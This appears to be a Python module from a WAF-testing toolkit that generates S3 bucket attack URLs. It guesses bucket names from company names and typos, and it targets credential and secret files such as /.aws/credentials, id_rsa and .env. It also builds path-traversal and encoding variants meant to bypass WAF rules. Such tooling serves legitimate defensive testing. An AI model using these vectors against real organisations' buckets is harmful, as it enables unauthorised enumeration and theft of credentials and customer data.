#!/usr/bin/env python3
"""
S3 Bucket Attack Vectors

This module contains attack vectors specific to S3 buckets, including enumeration,
access patterns, and WAF bypass techniques. It supports dynamic bucket name generation
based on company names or loading from external files.
"""

from typing import List, Optional, Dict, Any
import os
import re


class S3BucketVectors:
    """S3 bucket enumeration and disclosure vectors for testing AWS WAF rules."""
    
    # Basic S3 URL formats
    BASIC = [
        # Standard bucket URL formats
        "https://BUCKET_NAME.s3.amazonaws.com/",
        "https://s3.amazonaws.com/BUCKET_NAME/",
        "https://s3.REGION.amazonaws.com/BUCKET_NAME/",
        "https://BUCKET_NAME.s3.REGION.amazonaws.com/",
        
        # With specific objects
        "https://BUCKET_NAME.s3.amazonaws.com/file.txt",
        "https://s3.amazonaws.com/BUCKET_NAME/file.txt",
        "https://s3.amazonaws.com/BUCKET_NAME/path/to/file.txt",
        
        # With specific API operations
        "https://BUCKET_NAME.s3.amazonaws.com/?list-type=2",
        "https://s3.amazonaws.com/BUCKET_NAME/?list-type=2",
        "https://s3.amazonaws.com/BUCKET_NAME/?prefix=config",
    ]
    
    # Common sensitive files and paths in S3 buckets
    SENSITIVE_FILES = [
        # Configuration files
        "/config.json",
        "/config.yml",
        "/config.xml",
        "/settings.json",
        "/env.json",
        "/.env",
        "/configuration.json",
        "/credentials.json",
        "/credentials.xml",
        "/credentials.csv",
        "/app-config.json",
        "/database-config.json",
        
        # Keys and secrets
        "/keys/",
        "/secrets/",
        "/aws-keys.txt",
        "/api-keys.json",
        "/keys.txt",
        "/id_rsa",
        "/id_rsa.pub",
        "/htpasswd",
        "/password.txt",
        "/passwords.txt",
        
        # Database files
        "/backup.sql",
        "/backup.gz",
        "/database-backup.sql",
        "/db_backup.sql",
        "/export.sql",
        "/dump.sql",
        
        # User data
        "/users.csv",
        "/users.json",
        "/customers.csv",
        "/customers.json",
        "/accounts.json",
        "/users-export.csv",
        
        # Log files
        "/logs/",
        "/log/",
        "/access.log",
        "/error.log",
        "/application.log",
        "/app.log",
        "/debug.log",
        "/aws/logs/",
        
        # Source code
        "/.git/",
        "/.git/config",
        "/.git/HEAD",
        "/src/",
        "/source/",
        "/app/",
        "/dist/",
        "/build/",
        
        # Backup files
        "/backup/",
        "/backups/",
        "/.bak",
        "/old/",
        "/archive/",
        
        # Configuration files
        "/web.config",
        "/.htaccess",
        "/wp-config.php",
        "/config.php",
        
        # AWS specific
        "/cloudformation/",
        "/cloudformation-template.json",
        "/terraform/",
        "/terraform.tfstate",
        "/.aws/",
        "/.aws/credentials",
        "/.aws/config"
    ]
    
    # Default company pattern prefixes
    DEFAULT_COMPANIES = ["example", "company", "acme", "test"]
    
    # Default S3 bucket pattern suffixes
    DEFAULT_SUFFIXES = [
        "prod", "dev", "stage", "staging", "test", "uat", "qa", 
        "internal", "public", "private", "files", "data", "assets",
        "media", "backup", "backups", "archive", "archives", "logs",
        "logging", "cloudtrail", "cloudformation", "terraform", "config",
        "configuration", "analytics", "metrics", "billing", "users",
        "accounts", "images", "img", "documents", "docs", "static",
        "web", "website", "mobile", "app", "api", "cdn", "content",
        "upload", "uploads"
    ]
    
    # S3 URL manipulation and WAF bypass templates with BUCKET_NAME placeholders
    WAF_BYPASS_TEMPLATES = [
        # Path traversal
        "https://BUCKET_NAME.s3.amazonaws.com/../BUCKET_NAME/file.txt",
        "https://BUCKET_NAME.s3.amazonaws.com/./././file.txt",
        "https://BUCKET_NAME.s3.amazonaws.com/folder/../file.txt",
        "https://BUCKET_NAME.s3.amazonaws.com/%2e%2e/file.txt",
        
        # URL encoding variations
        "https://%42%55%43%4b%45%54%5f%4e%41%4d%45.s3.amazonaws.com/",
        "https://BUCKET_NAME.s3.amazonaws.com/%66%69%6c%65.%74%78%74",
        "https://BUCKET_NAME.s3.%61%6d%61%7a%6f%6e%61%77%73.com/file.txt",
        
        # Double encoding
        "https://BUCKET_NAME.s3.amazonaws.com/%252e%252e/file.txt",
        
        # Case variations
        "https://BUCKET_NAME.S3.amazonaws.com/",
        "https://BUCKET_NAME.s3.AMAZONAWS.com/",
        "https://BUCKET_NAME.s3.amazonaws.COM/",
        
        # Protocol and endpoint variations
        "http://BUCKET_NAME.s3.amazonaws.com/",
        "https://BUCKET_NAME.s3-website.REGION.amazonaws.com/",
        "http://BUCKET_NAME.s3-website-REGION.amazonaws.com/",
        
        # Specific S3 APIs
        "https://BUCKET_NAME.s3.amazonaws.com/?acl",
        "https://BUCKET_NAME.s3.amazonaws.com/?cors",
        "https://BUCKET_NAME.s3.amazonaws.com/?lifecycle",
        "https://BUCKET_NAME.s3.amazonaws.com/?policy",
        "https://BUCKET_NAME.s3.amazonaws.com/?logging",
        "https://BUCKET_NAME.s3.amazonaws.com/?versions",
        "https://BUCKET_NAME.s3.amazonaws.com/?versioning",
        "https://BUCKET_NAME.s3.amazonaws.com/?website",
        
        # S3 presigned URL pattern (would need actual signing in a real attack)
        "https://BUCKET_NAME.s3.amazonaws.com/file.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=EXAMPLE-CREDENTIAL/20230101/us-east-1/s3/aws4_request&X-Amz-Date=20230101T000000Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=EXAMPLE-SIGNATURE",
        
        # XML API access
        "https://s3.amazonaws.com/?prefix=BUCKET_NAME",
        "https://s3.amazonaws.com/?marker=BUCKET_NAME",
        "https://s3.amazonaws.com/?delimiter=/&prefix=BUCKET_NAME/"
    ]
    
    @classmethod
    def clean_bucket_name(cls, name: str) -> str:
        """
        Clean and normalize a potential bucket name to follow S3 naming conventions.
        
        Args:
            name: The raw bucket name to clean
            
        Returns:
            Cleaned bucket name following S3 naming conventions
        """
        # Remove any leading/trailing whitespace
        name = name.strip()
        
        # Convert to lowercase (S3 bucket names are case-insensitive)
        name = name.lower()
        
        # Replace invalid characters with hyphens
        # S3 bucket names can only contain lowercase letters, numbers, dots, and hyphens
        name = re.sub(r'[^a-z0-9.-]', '-', name)
        
        # Ensure name doesn't start or end with dot or hyphen
        name = name.strip('.-')
        
        # Ensure length is between 3 and 63 characters
        if len(name) < 3:
            name = name + "s3" * (3 - len(name))
        if len(name) > 63:
            name = name[:63]
        
        return name
    
    @classmethod
    def load_buckets_from_file(cls, file_path: str) -> List[str]:
        """
        Load bucket names from a file.
        
        Args:
            file_path: Path to the file containing bucket names (one per line)
            
        Returns:
            List of bucket names from the file
        """
        bucket_names = []
        
        try:
            if not os.path.exists(file_path):
                print(f"Warning: Bucket file {file_path} not found")
                return bucket_names
                
            with open(file_path, 'r') as f:
                for line in f:
                    # Strip whitespace and ignore empty lines or comments
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Normalize bucket name
                        bucket_name = cls.clean_bucket_name(line)
                        bucket_names.append(bucket_name)
            
            print(f"Loaded {len(bucket_names)} bucket names from {file_path}")
        except Exception as e:
            print(f"Error loading bucket names from {file_path}: {str(e)}")
        
        return bucket_names
    
    @classmethod
    def generate_bucket_patterns(cls, company_names: Optional[List[str]] = None) -> List[str]:
        """
        Generate bucket patterns based on company names.
        
        Args:
            company_names: List of company names to use for pattern generation
                           (uses default names if None provided)
            
        Returns:
            List of generated bucket name patterns
        """
        patterns = []
        
        # Use provided company names or defaults
        companies = company_names if company_names else cls.DEFAULT_COMPANIES
        
        # Clean company names
        cleaned_companies = [cls.clean_bucket_name(company) for company in companies]
        
        # Add base company names
        patterns.extend(cleaned_companies)
        
        # Add company names with suffixes
        for company in cleaned_companies:
            for suffix in cls.DEFAULT_SUFFIXES:
                # Different delimiter styles
                patterns.append(f"{company}-{suffix}")
                patterns.append(f"{company}.{suffix}")
                patterns.append(f"{company}{suffix}")  # No delimiter
        
        return patterns
    
    @classmethod
    def get_bucket_names(cls, bucket_file: Optional[str] = None, 
                         company_names: Optional[List[str]] = None) -> List[str]:
        """
        Get bucket names from file or generate from company names.
        
        Args:
            bucket_file: Optional path to file containing bucket names
            company_names: Optional list of company names to generate patterns
            
        Returns:
            List of bucket names
        """
        # Priority 1: Load from file if provided
        if bucket_file:
            bucket_names = cls.load_buckets_from_file(bucket_file)
            if bucket_names:
                return bucket_names
        
        # Priority 2: Generate from company names
        return cls.generate_bucket_patterns(company_names)
    
    @classmethod
    def get_basic_vectors(cls, bucket_names: List[str]) -> List[str]:
        """
        Get basic S3 bucket access vectors.
        
        Args:
            bucket_names: List of bucket names to use
            
        Returns:
            List of basic S3 access vectors
        """
        vectors = []
        
        # Replace BUCKET_NAME and REGION in each template
        for template in cls.BASIC:
            for bucket in bucket_names:
                # Replace with different AWS regions
                regions = ["us-east-1", "us-west-2", "eu-west-1", "ap-northeast-1"]
                for region in regions:
                    vector = template.replace("BUCKET_NAME", bucket).replace("REGION", region)
                    vectors.append(vector)
        
        return vectors
    
    @classmethod
    def get_sensitive_file_vectors(cls, bucket_names: List[str]) -> List[str]:
        """
        Get vectors targeting sensitive files in S3 buckets.
        
        Args:
            bucket_names: List of bucket names to use
            
        Returns:
            List of vectors targeting sensitive files
        """
        vectors = []
        
        # Use a subset of bucket names to avoid explosion in vector count
        test_buckets = bucket_names[:3] if len(bucket_names) > 3 else bucket_names
        
        # Test a subset of sensitive files against each bucket
        for bucket in test_buckets:
            # Basic URL template
            base_url = f"https://{bucket}.s3.amazonaws.com"
            
            # Add vectors for sensitive files
            for sensitive_file in cls.SENSITIVE_FILES:
                vectors.append(f"{base_url}{sensitive_file}")
        
        return vectors
    
    @classmethod
    def get_bypass_vectors(cls, bucket_names: List[str]) -> List[str]:
        """
        Get WAF bypass vectors with actual bucket names.
        
        Args:
            bucket_names: List of bucket names to use
            
        Returns:
            List of WAF bypass vectors with bucket names inserted
        """
        bypass_vectors = []
        
        # Use a subset of bucket names for bypass tests to avoid explosion in test count
        test_buckets = bucket_names[:5] if len(bucket_names) > 5 else bucket_names
        
        # Simple replacements of BUCKET_NAME in templates
        for template in cls.WAF_BYPASS_TEMPLATES:
            for bucket in test_buckets:
                bypass_vectors.append(template.replace("BUCKET_NAME", bucket))
        
        # Generate additional bucket-specific bypasses
        for bucket in test_buckets:
            # Custom bypass for this specific bucket
            bucket_parts = bucket.split('-')
            if len(bucket_parts) > 1:
                # Try to access with different segment combinations
                company = bucket_parts[0]
                env = bucket_parts[1] if len(bucket_parts) > 1 else ""
                
                # Try different separator variations
                bypass_vectors.append(f"https://{company}_{env}.s3.amazonaws.com/")
                bypass_vectors.append(f"https://{company}.{env}.s3.amazonaws.com/")
                
                # Try path-based access instead of subdomain
                bypass_vectors.append(f"https://s3.amazonaws.com/{company}-{env}/")
                bypass_vectors.append(f"https://s3.amazonaws.com/{company}_{env}/")
                
                # Try capitalization variations
                bypass_vectors.append(f"https://{company.upper()}-{env}.s3.amazonaws.com/")
                bypass_vectors.append(f"https://{company}-{env.upper()}.s3.amazonaws.com/")
            
            # Try bucket name with typos
            if len(bucket) > 3:
                # Switch two adjacent characters
                for i in range(len(bucket) - 1):
                    typo_bucket = bucket[:i] + bucket[i+1] + bucket[i] + bucket[i+2:]
                    bypass_vectors.append(f"https://{typo_bucket}.s3.amazonaws.com/")
                
                # Remove a character
                for i in range(len(bucket)):
                    typo_bucket = bucket[:i] + bucket[i+1:]
                    bypass_vectors.append(f"https://{typo_bucket}.s3.amazonaws.com/")
                
                # Add a character
                for i in range(len(bucket)):
                    for char in "abcdefghijklmnopqrstuvwxyz-0123456789":
                        typo_bucket = bucket[:i] + char + bucket[i:]
                        if len(typo_bucket) <= 63:  # S3 bucket name length limit
                            bypass_vectors.append(f"https://{typo_bucket}.s3.amazonaws.com/")
        
        return bypass_vectors
    
    @classmethod
    def all(cls, bucket_file: Optional[str] = None, company_names: Optional[List[str]] = None) -> List[str]:
        """
        Return all S3 bucket vectors with custom bucket names if provided.
        
        Args:
            bucket_file: Optional path to file containing bucket names
            company_names: Optional list of company names to generate patterns
            
        Returns:
            Complete list of S3 bucket test vectors
        """
        # Get bucket names
        bucket_names = cls.get_bucket_names(bucket_file, company_names)
        print(f"Generated {len(bucket_names)} bucket names for testing")
        
        # Generate different types of vectors
        basic_vectors = cls.get_basic_vectors(bucket_names[:10])  # Limit to avoid explosion
        sensitive_vectors = cls.get_sensitive_file_vectors(bucket_names)
        bypass_vectors = cls.get_bypass_vectors(bucket_names)
        
        # Combine all vectors
        all_vectors = basic_vectors + sensitive_vectors + bypass_vectors
        
        print(f"Generated {len(all_vectors)} S3 bucket test vectors")
        return all_vectors
    
    @classmethod
    def basic(cls, bucket_file: Optional[str] = None, company_names: Optional[List[str]] = None) -> List[str]:
        """Return basic S3 bucket vectors."""
        bucket_names = cls.get_bucket_names(bucket_file, company_names)
        return cls.get_basic_vectors(bucket_names[:10])  # Limit to avoid explosion
    
    @classmethod
    def sensitive(cls, bucket_file: Optional[str] = None, company_names: Optional[List[str]] = None) -> List[str]:
        """Return vectors targeting sensitive files in S3 buckets."""
        bucket_names = cls.get_bucket_names(bucket_file, company_names)
        return cls.get_sensitive_file_vectors(bucket_names)
    
    @classmethod
    def bypass(cls, bucket_file: Optional[str] = None, company_names: Optional[List[str]] = None) -> List[str]:
        """Return WAF bypass vectors for S3 buckets."""
        bucket_names = cls.get_bucket_names(bucket_file, company_names)
        return cls.get_bypass_vectors(bucket_names)


if __name__ == "__main__":
    # Simple test to demonstrate usage
    print("S3BucketVectors Test")
    print("====================")
    
    # Demo with default settings
    print("\nGenerating vectors with default settings:")
    vectors = S3BucketVectors.all()
    print(f"Generated {len(vectors)} total vectors")
    print(f"Examples: {vectors[:3]}")
    
    # Demo with company names
    print("\nGenerating vectors with custom company names:")
    company_names = ["acme", "contoso", "example-corp"]
    vectors = S3BucketVectors.all(company_names=company_names)
    print(f"Generated {len(vectors)} total vectors")
    print(f"Examples: {vectors[:3]}")
    
    # Demo with bucket file (simulation)
    print("\nSimulating loading from bucket file:")
    bucket_names = ["acme-prod", "acme-dev", "contoso-assets", "example-corp-backup"]
    vectors = S3BucketVectors.all(company_names=bucket_names)
    print(f"Generated {len(vectors)} total vectors")
    print(f"Examples: {vectors[:3]}")